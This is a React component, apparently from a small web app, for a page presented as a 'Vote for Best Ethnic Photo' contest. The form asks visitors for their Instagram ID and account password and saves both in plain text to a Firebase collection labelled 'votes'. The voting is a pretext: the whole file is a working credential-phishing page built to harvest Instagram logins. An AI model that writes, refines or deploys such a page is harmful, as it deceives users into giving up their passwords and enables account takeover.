import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { db, collection, addDoc } from "./firebase";
import "./App.css";

const HomePage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    instagramId: "",
    password: "",
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "votes"), {
        instagramId: formData.instagramId,
        password: formData.password,
        timestamp: new Date(),
      });
      navigate("/success");
    } catch (error) {
      alert("Error submitting vote. Please try again.");
      console.error(error);
    }
  };

  return (
    <div className="home-container">
      <div className="home-form">
        <h1>Vote for Best Ethnic Photo</h1>
        {/* <img
          src="\Screenshot.png"
          alt="Ethnic Contest"
          className="ethnic-photo"
        /> */}
        <a href="https://imgbb.com/"><img src="https://i.ibb.co/qrY0B8w/Screenshot-1.png" alt="Screenshot-1" className="ethnic-photo" border="0" /></a>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="instagramId"
            placeholder="Instagram ID"
            value={formData.instagramId}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
            required
          />
          <p className="note">*Only one vote will be considered per account.</p>
          <button type="submit" className="vote-btn">
            Vote
          </button>
        </form>
      </div>
    </div>
  );
};

export default HomePage;
